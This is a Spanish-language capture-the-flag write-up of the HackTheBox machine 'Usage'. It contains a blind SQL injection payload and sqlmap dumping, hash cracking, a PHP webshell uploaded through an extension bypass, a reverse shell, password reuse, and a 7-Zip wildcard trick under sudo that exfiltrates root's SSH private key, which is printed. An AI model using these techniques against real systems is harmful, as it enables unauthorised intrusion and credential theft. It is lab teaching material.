@@ -1,0 +1,551 @@
+---
+title: "Máquina Usage"
+description: "Resolución de la máquina Usage de HackTheBox"
+tags: ["Blind SQL Injection", "WebShell upload", "sudo", "Wildcard injection"]
+categories: ["HackTheBox", "Easy", "Linux"]
+logo: "/assets/writeups/usage/logo.webp"
+---
+
+En esta máquina vamos a abusar de una inyección SQL para obtener acceso a un panel administrativo, luego subiremos una webshell en PHP utilizando una función de foto de perfil y finalmente escalaremos privilegios abusando de un privilegio sudo que nos permite ejecutar un programa de administración del sistema.
+
+## Reconocimiento
+
+La máquina tiene dos puertos abiertos:
+
+```bash
+# Nmap 7.94 scan initiated Sun Apr 14 08:04:59 2024 as: nmap -sS -Pn -n -p- --open -oN ports --min-rate 100 -vvv 10.10.11.18
+Nmap scan report for 10.10.11.18
+Host is up, received user-set (0.16s latency).
+Scanned at 2024-04-14 08:04:59 -04 for 137s
+Not shown: 63932 closed tcp ports (reset), 1601 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sun Apr 14 08:07:16 2024 -- 1 IP address (1 host up) scanned in 137.50 seconds
+```
+
+El sitio web al que nos redirije es `usage.htb`, vamos a agregar este dominio a nuestro archivo de hosts:
+
+```bash
+10.10.11.18 usage.htb
+```
+{: file="/etc/hosts"}
+
+Haciéndolo y luego accediendo de nuevo, podremos ver un simple panel que nos pide credenciales
+
+![Web](/assets/writeups/usage/1.png)
+
+Veamos como lo bypasseamos.
+
+## Intrusión
+
+Si nos vamos a `Reset Password` e intentamos colocar caráctares raros como la comilla, de pronto el servidor nos tirará un error; pero si intentamos hacer la típica inyección SQL para una tautología (`OR 1=1 -- -`), ahora el servidor no dirá que el enlace para reiniciar la contraseña fue enviado satisfactoriamente al correo; lo que es un claro indicio de una inyección SQL a ciegas.
+
+![Tautology](/assets/writeups/usage/2.png)
+
+Como estamos ante una dificultad sencilla y no nos queremos complicar mucho, utilizaremos SQLMap para esta labor. Puedes hacer una petición a la ruta vulnerable, luego guardarla en un archivo para pasárselo a SQLMap o simplemente hacerle manualmente. Yo iré por la segunda:
+
+```bash
+❯ sqlmap -u http://usage.htb/forget-password --cookie="XSRF-TOKEN=eyJpdiI6IkZUUE8yNG1qTWdPVEJrQnFuSk9jcnc9PSIsInZhbHVlIjoidk1YMk9mTUhyMWpySmp1VFh6VmJ3MG9rN3NLdnhvb1N2WS9jVGNIVnRIbkZVN2MyN2Jvd05vM3FwTWVIbVJjdml2N2VuTEwxeEVKcFdBTnhXU1NhYWFNU2Ntem92OTVaVks4ZGhtMURSOWdzMkZ5SXVWTnp0UGlnVG5ML3JkTEciLCJtYWMiOiJmOGNmZmUwZGI4OTQ3ZTA5YmZmZmViNGJjOWYwMjBmODY5YjVhNmZiODY4ZWJlYjI3YWU3OTNmNTgzYmE3YTAwIiwidGFnIjoiIn0=; laravel_session=eyJpdiI6ImtmRHZwMThpRHp0T25yaWxiWDB1cnc9PSIsInZhbHVlIjoiY1Z4aU1lS0dKQklEeGNWRGtKdkE1Nm9pd04rcDJ0WmdadTVNYm81UU0xdERCbllsZlY0dUUyR1dEaWRTUFpNdzhWNjNKc2ZPY1FZb0h1OVg3VDJSVU5PbGlVYU1IbzM0K1ltUDVLUFF6YW9Zb1lwd1AzMUNiQlFNYytOT0V3Sm8iLCJtYWMiOiJkZmU2YmRiNTQ2YzEyYTUxMzlmZDA3MjJkMDkzZjlhOGEzMGVhZTk1OGQ4NTIzMmVmOTE0NjA1OGUxNzI2ZmU1IiwidGFnIjoiIn0=" --dbms=mysql --data="_token=gsk9r6ufTLKPQ2nG4YIJYshKLyKnbhoQM5YZsO3u&email=test@test.com" --level 5 --risk 3
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8.6.3#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:33:19 /2024-08-09/
+
+POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
+[20:33:21] [INFO] testing connection to the target URL
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y
+got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
+[20:33:38] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: _token=i2Ds4ewbYMa4v0PnAZmciihK3Qyt3QHzlinVK7Q3&email=1' AND 6962=(SELECT (CASE WHEN (6962=6962) THEN 6962 ELSE (SELECT 8525 UNION SELECT 1848) END))-- -
+---
+[20:33:38] [INFO] testing MySQL
+[20:33:38] [INFO] confirming MySQL
+[20:33:38] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[20:33:38] [INFO] fetched data logged to text files under '/home/vzon/.local/share/sqlmap/output/usage.htb'
+
+[*] ending @ 20:33:38 /2024-08-09/
+```
+
+Bien, como yo lo hice antes me muestra que ya tiene una sesión de esta web guardada. Pero a ti te dirá otra serie de preguntas mientras intenta encontrar la inyeccción (te dejo como reto ver como manejarlo). De aquí podras pedirle que dumpee de la base de datos del sitio web usuarios y hashes:
+
+```bash
+... [snip]
+# Ver la base de datos actual
+[20:38:35] [INFO] retrieved: usage_blog
+current database: 'usage_blog'
+# Ver tablas
+20:42:42] [INFO] fetching tables for database: 'usage_blog'
+[20:42:42] [INFO] fetching number of tables for database 'usage_blog'
+[20:42:42] [INFO] resumed: 15
+[20:42:42] [INFO] resumed: admin_menu
+[20:42:42] [INFO] resumed: admin_operation_log
+[20:42:42] [INFO] resumed: admin_permissions
+[20:42:42] [INFO] resumed: admin_role_menu
+[20:42:42] [INFO] resumed: admin_role_permissions
+[20:42:42] [INFO] resumed: admin_role_users
+[20:42:42] [INFO] resumed: admin_roles
+[20:42:42] [INFO] resumed: admin_user_permissions
+[20:42:42] [INFO] resumed: admin_users
+[20:42:42] [INFO] resumed: blog
+[20:42:42] [INFO] resumed: failed_jobs
+[20:42:42] [INFO] resumed: migrations
+[20:42:42] [INFO] resumed: password_reset_tokens
+[20:42:42] [INFO] resumed: personal_access_tokens
+[20:42:42] [INFO] resumed: users
+Database: usage_blog
+[15 tables]
++------------------------+
+| admin_menu             |
+| admin_operation_log    |
+| admin_permissions      |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_role_users       |
+| admin_roles            |
+| admin_user_permissions |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| personal_access_tokens |
+| users                  |
++------------------------+
+# Sacar toda la información de la tabla admin_users
+[20:51:47] [INFO] fetching columns for table 'admin_users' in database 'usage_blog'
+[20:51:47] [INFO] resumed: 8
+[20:51:47] [INFO] resumed: id
+[20:51:47] [INFO] resumed: username
+[20:51:47] [INFO] resumed: password
+[20:51:47] [INFO] resumed: name
+[20:51:47] [INFO] resumed: avatar
+[20:51:47] [INFO] resumed: remember_token
+[20:51:47] [INFO] resumed: created_at
+[20:51:47] [INFO] resumed: updated_at
+[20:51:47] [INFO] fetching entries for table 'admin_users' in database 'usage_blog'
+[20:51:47] [INFO] fetching number of entries for table 'admin_users' in database 'usage_blog'
+[20:51:47] [INFO] resumed: 1
+[20:51:47] [INFO] resumed: Administrator
+[20:51:47] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[20:51:47] [INFO] retrieved: 
+[20:51:49] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[20:51:49] [INFO] resumed: 2023-08-13 02:48:26
+[20:51:49] [INFO] resumed: 1
+[20:51:49] [INFO] resumed: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
+[20:51:49] [INFO] resumed: kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT
+[20:51:49] [INFO] resumed: 2023-08-23 06:02:19
+[20:51:49] [INFO] resumed: admin
+Database: usage_blog
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+... [snip]
+```
+
+Luego de un rato, como vemos obtendremos un hash y usuario. El hash se crackea en poco:
+
+```bash
+❯ hashcat -m 3200 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt      
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0  Linux, Release, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+================================================================================================================================
+* Device #1: cpu-haswell-Intel(R) Core(TM) i5-6300U CPU @ 2.40GHz, 2861/5787 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+... [snip]
+
+$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH...fUPrL2
+Time.Started.....: Fri Aug  9 20:56:18 2024 (30 secs)
+Time.Estimated...: Fri Aug  9 20:56:48 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       55 H/s (9.11ms) @ Accel:4 Loops:32 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1600/14344384 (0.01%)
+Rejected.........: 0/1600 (0.00%)
+Restore.Point....: 1584/14344384 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: alexis1 -> dragon1
+Hardware.Mon.#1..: Temp: 69c Util: 90%
+
+Started: Fri Aug  9 20:55:35 2024
+Stopped: Fri Aug  9 20:56:50 2024
+```
+
+Con esta credencial ahora podemos acceder a la parte administrativa ubicada en `admin.usage.htb`:
+
+![Admin panel](/assets/writeups/usage/3.png)
+
+Podemos ver atributos del servidor como la versión de PHP, el software CGI, la versión de Laravel y la versión del servidor web. Buscando por cosas que podamos manipular por acá encontraremos que podemos subir una foto de perfil:
+
+![PFP](/assets/writeups/usage/4.png)
+
+Si intentamos seleccionar un archivo PHP para subirlo, nos va a salir que solo admite las extensiones estándar de imágenes. Pero si le cambiamos la extensión al archivo a una de imagen en cuestión, nos dejará, y al cambiar la extensión a la original interceptando la petición, el archivo se subirá como un PHP:
+
+![PHP PFP](/assets/writeups/usage/5.png)
+
+> Curiosamente, este panel es uno conocido como laravel-admin y la versión instalada tiene una vulnerabilidad catalogada como CVE-2023-24249 y es exactamente sobre esto mismo. Yo la realicé sin siquiera saber de la existencia del CVE xd
+{: .prompt-info }
+
+Por lo que ya podremos ejecutar comandos en el servidor simplemente subiendo una webshell sencilla como esta:
+
+```php
+<?php
+  system($_GET['uwu']);
+?>
+```
+{: file="test.php"}
+
+Enviándole el comando que queremos ejecutar en el parámetro `uwu`, podremos enviarnos una reverse shell:
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.18 51450
+bash: cannot set terminal process group (1247): Inappropriate ioctl for device
+bash: no job control in this shell
+dash@usage:/var/www/html/project_admin/public/uploads/images$ script /dev/null -c bash # Iniciar un nuevo proceso con una tty alocada      
+Script started, output log file is '/dev/null'.
+dash@usage:/var/www/html/project_admin/public/uploads/images$ ^Z # CTRL + Z
+[1]  + 10150 suspended  nc -lvnp 443
+
+❯ stty raw -echo; fg  # Pasar controles de la terminal al proceso
+[1]  + 10150 continued  nc -lvnp 443
+                                    reset xterm # Reiniciar la terminal
+dash@usage:/var/www/html/project_admin/public/uploads/images$ stty rows 34 columns 149 # Ajustar filas y columnas
+dash@usage:/var/www/html/project_admin/public/uploads/images$ export TERM=xterm-256color # Establecer el tipo de terminal
+dash@usage:/var/www/html/project_admin/public/uploads/images$ bash
+```
+
+En la carpeta personal de este usuario, podremos encontrar la primera flag:
+
+```bash
+dash@usage:~$ ls -la
+total 52
+drwxr-x--- 6 dash dash 4096 Aug 16 22:04 .
+drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
+-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
+-rw-r--r-- 1 dash dash    5 Aug 16 22:04 .monit.pid
+-rw------- 1 dash dash 1192 Aug 16 22:04 .monit.state
+-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
+-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
+drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
+-rw-r----- 1 root dash   33 Aug 16 21:46 user.txt
+dash@usage:~$ cat user.txt
+cb5c1137bd2beb4eecab174a2d******
+```
+
+## Escalada de privilegios
+
+En la misma carpeta personal del usuario, hay ficheros que llevan de nombre `monit`, viendo el `.monitrc` vemos algo curioso:
+
+```bash
+dash@usage:~$ cat .monitrc
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+
+#Apache
+check process apache with pidfile "/var/run/apache2/apache2.pid"
+    if cpu > 80% for 2 cycles then alert
+
+
+#System Monitoring 
+check system usage
+    if memory usage > 80% for 2 cycles then alert
+    if cpu usage (user) > 70% for 2 cycles then alert
+        if cpu usage (system) > 30% then alert
+    if cpu usage (wait) > 20% then alert
+    if loadavg (1min) > 6 for 2 cycles then alert 
+    if loadavg (5min) > 4 for 2 cycles then alert
+    if swap usage > 5% then alert
+
+check filesystem rootfs with path /
+       if space usage > 80% then alert
+```
+
+También podemos ver que existe otro usuario en el sistema:
+
+```bash
+dash@usage:~$ ls -la /home
+total 16
+drwxr-xr-x  4 root   root   4096 Aug 16  2023 .
+drwxr-xr-x 19 root   root   4096 Apr  2 21:15 ..
+drwxr-x---  6 dash   dash   4096 Aug 16 22:07 dash
+drwxr-x---  4 xander xander 4096 Apr  2 20:25 xander
+```
+
+Probando esta contraseña con ese usuario, podremos acceder como él
+
+```bash
+dash@usage:~$ su xander
+Password: 
+xander@usage:/home/dash$ cd
+xander@usage:~$
+```
+
+y justamente, tiene un permiso sudo asignado
+
+```bash
+xander@usage:~$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+```
+
+Es un binario ELF64; en él podemos hacer un backup de la web, de la base de datos y reiniciar la contraseña del usuario administrador. La función que llama la atención es evidentemente, hacer un backup de la web
+
+```bash
+xander@usage:~$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)
+
+Scanning the drive:
+2984 folders, 17972 files, 114778695 bytes (110 MiB)                         
+
+Creating archive: /var/backups/project.zip
+
+Items to compress: 20956
+
+                                                                               
+Files read from disk: 17972
+Archive size: 54871391 bytes (53 MiB)
+Everything is Ok
+```
+
+Viendo las cadenas que existen el programa, podremos hayar el comando que ejecuta para hacer esta acción:
+
+```bash
+xander@usage:~$ strings /usr/bin/usage_management
+... [snip]
+/var/www/html
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+Error changing working directory to /var/www/html
+/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
+... [snip]
+```
+
+Ese asterisco llama la atención, ya que básicamente tomará **todo** lo que encuentre en el directorio actual, aunque la doble barra de al principio nos impide inyectar argumentos al 7z podemos mirar por otras cosas. Viendo la documentación de 7zip podremos encontrar una opción interesante:
+
+![7z](/assets/writeups/usage/6.png)
+
+Podemos intentar crear un archivo de inclusiones que contenga la llave SSH de root si es que existe, y luego hacer el backup:
+
+```bash
+xander@usage:/var/www/html$ ls -la
+total 24
+drwxrwxrwx  4 root   xander 4096 Aug 16 23:02 .
+drwxr-xr-x  3 root   root   4096 Apr  2 21:15 ..
+drwxrwxr-x 13 dash   dash   4096 Apr  2 21:15 project_admin
+drwxrwxr-x 12 dash   dash   4096 Apr  2 21:15 usage_blog
+-rw-rw-r--  1 xander xander   19 Aug 16 23:00 @uwu
+-rw-rw-r--  1 xander xander   18 Aug 16 23:02 uwu
+xander@usage:/var/www/html$ cat uwu
+/root/.ssh/id_rsa
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)
+
+Open archive: /var/backups/project.zip
+--       
+Path = /var/backups/project.zip
+Type = zip
+Physical Size = 54871526
+
+Scanning the drive:
+2984 folders, 17974 files, 114779112 bytes (110 MiB)        
+
+Updating archive: /var/backups/project.zip
+
+Items to compress: 20958
+
+                                                                               
+Files read from disk: 17974
+Archive size: 54871913 bytes (53 MiB)
+Everything is Ok
+```
+
+Examinando el comprimido que se ha creado, podremos ver que hay un archivo `id_rsa`
+
+```bash
+xander@usage:/tmp/test$ cp /var/backups/project.zip . 
+xander@usage:/tmp/test$ unzip project.zip 
+Archive:  project.zip
+  inflating: id_rsa                  
+   creating: project_admin/
+  inflating: project_admin/.editorconfig  
+  inflating: project_admin/.env      
+  inflating: project_admin/.env.example  
+  inflating: project_admin/.gitattributes  
+  inflating: project_admin/.gitignore  
+  inflating: project_admin/README.md  
+   creating: project_admin/app/
+... [snip]
+xander@usage:/tmp/test$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Con esto ya podremos acceder como root y tomar la última flag.
+
+```bash
+❯ /usr/bin/ssh -i root.rsa root@usage.htb
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Sat Aug 17 12:12:44 AM UTC 2024
+
+  System load:           0.0
+  Usage of /:            71.5% of 6.53GB
+  Memory usage:          23%
+  Swap usage:            0%
+  Processes:             226
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.18
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:b45b
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
+root@usage:~# ls
+cleanup.sh  root.txt  snap  usage_management.c
+root@usage:~# cat root.txt
+86c43afdee094320b974ebf589******
+```
+
+## Extra
+
+Este es el código del programa `usage_management`, que por alguna razón quedó en la carpeta de root como se puede apreciar arriba:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void backupWebContent() {
+    if (chdir("/var/www/html") == 0) {
+        // Change working directory to /var/www/html
+        //char* filename = "project.zip";
+        // Use 7za to create a backup in the parent directory
+        system("/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *");
+    } else {
+        perror("Error changing working directory to /var/www/html");
+    }
+}
+
+void backupMysqlData() {
+    // Use mysqldump to create a backup of the MySQL data
+    system("/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql");
+}
+
+void resetAdminPassword() {
+    // Use MySQL command to reset the admin password
+    //system("mysql -D usage_blog -e 'UPDATE admin_users SET password=\"whatever1\" WHERE username=\"admin\";'");
+      printf("Password has been reset.\n");
+}
+
+int main() {
+    int choice;
+
+    printf("Choose an option:\n");
+    printf("1. Project Backup\n");
+    printf("2. Backup MySQL data\n");
+    printf("3. Reset admin password\n");
+    printf("Enter your choice (1/2/3): ");
+    scanf("%d", &choice);
+
+    switch (choice) {
+        case 1:
+            backupWebContent();
+            break;
+        case 2:
+            backupMysqlData();
+            break;
+        case 3:
+            resetAdminPassword();
+            break;
+        default:
+            printf("Invalid choice.\n");
+            break;
+    }
+
+    return 0;
+}
+
+```
+
